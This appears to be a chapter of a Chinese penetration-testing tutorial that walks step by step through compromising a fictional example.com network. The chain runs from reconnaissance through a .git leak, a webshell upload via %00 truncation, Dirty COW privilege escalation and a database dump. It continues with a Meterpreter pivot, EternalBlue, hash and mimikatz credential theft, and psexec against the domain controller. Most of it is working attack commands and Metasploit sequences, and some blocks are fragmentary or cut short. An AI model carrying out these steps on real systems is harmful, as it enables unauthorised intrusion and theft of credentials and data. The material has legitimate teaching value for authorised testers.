## 11.2 第一步：信息收集

兵马未动，信息先行。
先不碰目标，从外围收集信息。

### 11.2.1 域名和子域名

```bash
# 主域名：example.com

# 先查Whois
whois example.com
# → 查到注册商、DNS服务器、注册时间等

# 子域名收集（被动）
amass enum -passive -d example.com -o subs_passive.txt
sublist3r -d example.com -o subs_sublist3r.txt

# 合并去重
cat subs_*.txt | sort -u > all_subs.txt

# 主动验证哪些存活
cat all_subs.txt | while read sub; do
    ping -c 1 -W 1 $sub > /dev/null 2>&1 && echo "$sub 存活"
done

# 也可以用massdns或者httpx批量验证
```

最后收集到的子域名：

```
www.example.com          主站
mail.example.com         邮件系统（Exchange）
vpn.example.com          VPN入口
oa.example.com           OA系统
shop.example.com         商城
test.example.com         测试站（重点关注！）
dev.example.com          开发站
api.example.com          API接口
cdn.example.com          CDN
backup.example.com       备份系统（重点！）
```

### 11.2.2 端口和服务扫描

```bash
# 先masscan快速扫存活和端口
masscan -p1-65535 -iL ips.txt --rate=1000 -oL masscan_result.txt

# 然后nmap对开着的端口做详细扫描
nmap -sV -sC -p 22,80,443,3389,8080... -iL ips.txt -oA nmap_result
```

扫描结果（部分）：

## 11.3 第二步：突破边界

选最软的柿子捏——test.example.com。

### 11.3.1 第一个突破口：Git泄露

目录扫描发现 `/.git/` 可以访问！

```bash
# 用GitHack把源代码扒下来
python GitHack.py http://test.example.com/.git/

# 得到了网站的源代码！
# 开始审计代码...

# 找配置文件
cat config.php
# 找到数据库配置：
# $dbhost = 'localhost';
# $dbuser = 'testuser';
# $dbpass = 'Test@123456';
# $dbname = 'testdb';

# 还找到后台管理员密码：
# 硬编码在代码里了...
# admin / Admin@2024
```

> 🎉 **第一个成果**：
> - 源代码到手
> - 数据库密码拿到
> - 后台管理员密码拿到

### 11.3.2 登录后台，拿WebShell

用拿到的密码登录后台：
- 后台地址：http://test.example.com/admin/
- 用户名：admin
- 密码：Admin@2024

登录成功！

然后在后台找上传点：
```
后台功能：
  • 新闻发布 → 可以上传图片
  • 产品管理 → 可以上传图片
  • 头像上传 → 可以上传头像
  • ......
```

测试头像上传：
```
1. 先传个正常图片，成功
2. 改后缀传php，被拦了
3. 试试各种绕过：
   • 大小写：shell.php → 不行
   • 双后缀：shell.jpg.php → 不行
   • %00截断：shell.php%00.jpg → 可以！
   （PHP版本比较老，5.2的，有%00截断漏洞）
```

传上去之后访问：
```
http://test.example.com/upload/avatar/shell.php%00.jpg
→ 成功执行！
```

> 🎉 **拿到WebShell了！**
> 不过是www-data权限，还得提权。

### 11.3.3 提权到root

先收集信息：

```bash
# 系统信息
uname -a
# Linux test 2.6.32-279.el6.i686 #1 SMP i686 i686 i386 GNU/Linux
# 内核 2.6.32，32位系统，CentOS 6

# 当前用户
id
# uid=48(apache) gid=48(apache) groups=48(apache)

# 看内核漏洞
# 2.6.32的话，脏牛（Dirty COW）应该可以打！
```

上传脏牛的exp，编译运行：

```bash
# 把dirtycow的c文件传上去
gcc -pthread dirty.c -o dirty -lcrypt
# 编译

./dirty
# 运行
# 等几分钟...
```

成功！拿到root权限：

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

> 🎉 **第一台服务器拿下：test.example.com（root权限）**

### 11.3.4 顺手拿下数据库

既然有root了，数据库就不用说了：

```bash
# 进MySQL
mysql -u root -p
# （root密码在/etc/my.cnf里找到了）

# 看数据库
show databases;
# information_schema, testdb, mysql...

# 导出所有数据库
mysqldump -u root --all-databases > all_db.sql
```

还在数据库里找到了各个系统的用户密码（很多人密码都一样）。

## 11.4 第三步：进入内网

拿到了外网的一台服务器，
但这台机器在DMZ区，
我们的目标是办公网的域控。

先看看这台机器的网络情况：

```bash
# 网卡信息
ip a
# eth0: 1.1.1.3（公网IP）
# eth1: 192.168.10.10（内网IP，DMZ网段）

# 路由表
route -n
# 看内网有哪些网段

# 扫一下内网
nmap -sn 192.168.10.0/24
# 发现：
# 192.168.10.1  → 网关
# 192.168.10.10 → 自己
# 192.168.10.20 → 另一台服务器
# 192.168.10.30 → 第三台
```

### 11.4.1 搭代理，把工具带进来

```bash
# 用MSF的meterpreter搭socks代理
# 先传个马上去，反弹Meterpreter回来

# 然后加路由
meterpreter > run autoroute -s 192.168.10.0/24

# 再开socks代理
meterpreter > background
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVHOST 127.0.0.1
msf6 > set SRVPORT 1080
msf6 > run
```

现在本地的工具设上socks代理，
就能直接扫内网了！

### 11.4.2 扫描内网服务器

```bash
# 扫192.168.10.0/24
nmap -sV -sT -T4 192.168.10.0/24

# 发现：
192.168.10.20
  80/tcp   http    IIS 7.5
  445/tcp  microsoft-ds
  3306/tcp mysql
  3389/tcp ms-term-serv

192.168.10.30
  22/tcp   ssh     OpenSSH 6.6
  80/tcp   http    nginx
  445/tcp  microsoft-ds？不对，Linux怎么开了445？
  ...
```

> 🎯 **重点关注**：192.168.10.20
> 开了445和3389，是Windows服务器！
> 说不定在域里。

### 11.4.3 打192.168.10.20（Windows）

先试试永恒之蓝：

```bash
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 > set RHOSTS 192.168.10.20
msf6 > run

# 结果：Host is likely VULNERABLE to MS17-010!
# 🎉 有漏洞！

# 直接打
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 192.168.10.20
msf6 > set payload windows/x64/meterpreter/bind_tcp
# （内网用bind_tcp，反向可能连不回来）
msf6 > run

# 等了一会儿...
# [*] Meterpreter session 1 opened
```

> 🎉 **第二台服务器拿下：192.168.10.20（SYSTEM权限）**

抓哈希：

```bash
meterpreter > hashdump

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
IIS_USER:1001:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
...
```

看看这台机器在不在域里：

```bash
meterpreter > sysinfo
Computer        : WEB01
OS              : Windows Server 2008 R2 (6.1 Build 7601).
Architecture    : x64
Domain          : EXAMPLE
# ↑ 在域里！域名是EXAMPLE！
```

太好了！进入域环境了！

拿到一台域内机器的SYSTEM权限，

### 11.5.1 基本信息

```bash
# 域信息

# → 域控IP可能是 192.168.20.10
```

### 11.5.2 找域管登录过的机器

域管如果登录过这台机器，
我们就能从内存里抓域管的哈希，
然后哈希传递打域控。

```bash
# 用mimikatz抓

# （mimikatz的meterpreter版）

# 看看抓到了什么凭据

# 结果：
# 抓到了一个叫 admin_li 的域用户的明文密码！
```

> 🎉 **运气爆棚！抓到域管理员的密码了！**

## 11.6 第五步：拿下域控

既然都拿到域管密码了，
打域控就很简单了。

### 11.6.1 哈希传递打域控

```bash
# 用psexec模块
msf6 > use exploit/windows/smb/psexec
msf6 > set RHOSTS 192.168.20.10
msf6 > set SMBUser admin_li
msf6 > set SMBPass AdminLi@2024
msf6 > set PAYLOAD windows/x64/meterpreter/bind_tcp
msf6 > run

# ......
# [*] Meterpreter session 2 opened (192.168.10.10:49152 -> 192.168.20.10:445)
```

> 🎉🎉🎉 **域控拿下了！**
> 整个域都在我们手里了！

验证一下：

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > sysinfo
Computer        : DC01
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
Domain          : EXAMPLE
```

### 11.6.2 域控上能干嘛

拿到域控，整个域就都是你的了：

```bash
# 1. 导出所有域用户哈希

# 5. 随便访问任何一台域内机器
```

```
  4. 打MS17-010补丁，关闭不必要的SMB

  7. 定期做渗透测试和安全加固
  ......
```

## 11.9 实战总结与思考

### 11.9.1 渗透路径回顾

```
外网信息收集
    ↓
发现test.example.com的.git泄露
    ↓
拿到源代码和管理员密码
    ↓
后台登录，上传WebShell（%00截断）
    ↓
脏牛内核漏洞提权 → root
    ↓
内网代理，扫内网
    ↓
永恒之蓝打内网Windows服务器 → SYSTEM
    ↓
抓到域管理员密码（mimikatz）
    ↓
哈希传递PsExec打域控 → 域控SYSTEM
    ↓
任务完成！
```

### 11.9.2 为什么这么顺利？

这个案例看起来一路绿灯，
是不是太顺利了？

```
现实中可能碰到的困难：

1. 没有Git泄露怎么办？
   → 找其他漏洞，SQL注入、命令注入...
   → 实在不行试试0day？（别想了，哪来那么多0day）

2. 文件上传过滤很严怎么办？
   → 找其他漏洞，或者打服务端漏洞
   → 比如vsftpd的漏洞、Tomcat弱口令...

3. 内核打不了脏牛怎么办？
   → 试试其他提权方法
   → sudo配置错误、SUID、计划任务...
   → 实在提不了就先横向，找其他机器

4. 内网机器都打了补丁怎么办？
   → 抓哈希、碰运气密码复用
   → 钓鱼（社工）
   → 打应用层漏洞
   → 利用信任关系

5. 域管没登录过这台机器怎么办？
   → 找其他域管登录过的机器
   → Kerberoast攻击
   → 委派漏洞
   → 其他域内漏洞
```

真实的渗透测试往往不会这么顺利，
可能卡好久都拿不下一个目标，
这很正常，多试试不同的思路。

### 11.9.3 给新手的建议

```
给新手的几点建议：

1. 信息收集一定要做足
   很多时候不是你技术不行，
   是你信息收集不够，
   错过了最容易的突破口。

2. 思路要开阔
   这条路走不通就换一条，
   别死磕一个点。
   方法总比困难多。

3. 多积累，多总结
   每次测试完都写总结，
   什么漏洞怎么打，
   什么情况怎么处理，
   积累多了就熟练了。

4. 打好基础
   工具只是工具，
   原理才是根本。
   知道漏洞为什么会产生，
   才能灵活应变。

5. 遵守法律和道德
   没有授权的测试绝对不能做，
   黑产碰都别碰。
   技术是用来保护人的，
   不是用来搞破坏的。
```
